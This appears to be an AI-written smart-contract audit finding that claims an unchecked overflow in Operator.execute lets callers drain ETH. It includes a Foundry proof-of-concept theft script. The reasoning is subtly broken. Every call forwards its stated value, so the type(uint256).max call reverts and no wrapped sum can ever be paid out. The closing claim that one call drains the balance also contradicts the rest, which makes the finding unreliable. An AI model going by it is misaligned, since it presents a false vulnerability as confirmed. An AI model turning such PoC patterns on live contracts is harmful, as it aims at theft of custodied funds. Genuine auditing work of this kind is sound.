### Title
Unchecked overflow in `Operator.execute` value summation lets calls spend more ETH than `msg.value` - (File: contracts/Operator.sol)

### Summary
`Operator.execute` accumulates the per-call `value` fields inside an `unchecked` block (`_sumOfValues += _value`). An attacker can craft a batch whose individual `value`s sum to `2^256 + msg.value`, wrapping `_sumOfValues` back to `msg.value`. The conservation check `require(msg.value == _sumOfValues)` then passes even though the calls collectively forward far more ETH than the caller supplied. This is a direct analog of the fbcon bug class: an arithmetic overflow in a user-controlled size calculation defeats a later bounds/allocation check.

### Finding Description
In `contracts/Operator.sol:34-55`:

```solidity
uint256 _sumOfValues;
Call calldata _call;
for (uint256 i; i < _length; ) {
    _call = calls_[i];
    uint256 _value = _call.value;
    unchecked {
        _sumOfValues += _value;   // wraps past type(uint256).max
    }
    _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
    unchecked {
        ++i;
    }
}
require(msg.value == _sumOfValues, "value-mismatch");
```

`execute` is a public, `payable` entry point reachable by any EOA. `Call.value` and `Call.target` are fully attacker-controlled. The only constraint tying the batch to the caller's payment is the wrapped sum check.

Example batch (attacker sends `msg.value = 1 wei`):
- call 0: `value = type(uint256).max` → `functionCallWithValue` attempts to forward `2^256 - 1` wei
- call 1: `value = 2` → `_sumOfValues` wraps to `1`

`_sumOfValues` ends at `1 == msg.value`, so the check passes, while the Operator was asked to dispense `2^256 + 1` wei total.

### Impact Explanation
The wrapped sum lets the attacker make the Operator pay out more ETH than was deposited in the transaction. Any ETH balance held by the `Operator` contract at execution time — e.g., leftover refunds from prior batched calls where a downstream contract returned ETH to `address(this)` (the Operator), accidental sends, or force-fed ETH — can be drained by routing a wrapped-sum batch to an attacker-controlled target. This is direct theft of funds custodied by a protocol contract. If the Operator holds no ETH the calls simply revert on insufficient balance, so the practical severity depends on the deployed contract's ETH holdings, but the conservation invariant is unconditionally broken.

### Likelihood Explanation
- Reachability: `execute` is permissionless; only `nonReentrant` and `setMsgSender` apply, neither of which constrains `value` fields.
- Preconditions: the exploit only pays out if `Operator` carries an ETH balance at execution time (residual refunds are realistic for a multicall-style forwarder, and ETH can also arrive via `selfdestruct`). Without a balance, the attack is a no-op.
- No privileged role, oracle, or governance action is needed.

### Recommendation
Remove the `unchecked` wrapper around `_sumOfValues += _value` so an overflow reverts, or accumulate with checked arithmetic and keep the `msg.value == _sumOfValues` check. Additionally consider sweeping/refunding residual ETH out of the Operator (e.g., forwarding leftover `address(this).balance` to `msg.sender` at the end of `execute`).

### Proof of Concept
Foundry sketch against the deployed Operator:

```solidity
function test_executeValueOverflow() public {
    IOperator op = IOperator(OPERATOR);

    // simulate residual ETH held by Operator (e.g. from a prior refund)
    vm.deal(address(op), 100 ether);

    IOperator.Call[] memory calls = new IOperator.Call[](2);
    calls[0] = IOperator.Call({
        target: payable(attacker),
        callData: "",
        value: type(uint256).max
    });
    calls[1] = IOperator.Call({
        target: payable(attacker),
        callData: "",
        value: 2
    });

    // wrapped sum = max + 2 = 1 -> passes msg.value check with only 1 wei
    op.execute{value: 1}(calls);

    assertEq(address(op).balance, 0);
    assertGt(attacker.balance, 0); // attacker received up to Operator's full balance
}
```

A receiving target is any payable address (an attacker contract with a `receive()` fallback that doesn't revert). The first call alone, or a small set of calls summing to `Operator.balance + k*2^256 + msg.value`, extracts the full ETH balance.

One caveat I could not fully verify within the iteration budget: whether any production flow reliably leaves ETH parked in `Operator` (which would raise this from "theft of residual/donated ETH" to reliable theft). The overflow and broken conservation check are confirmed in the code regardless.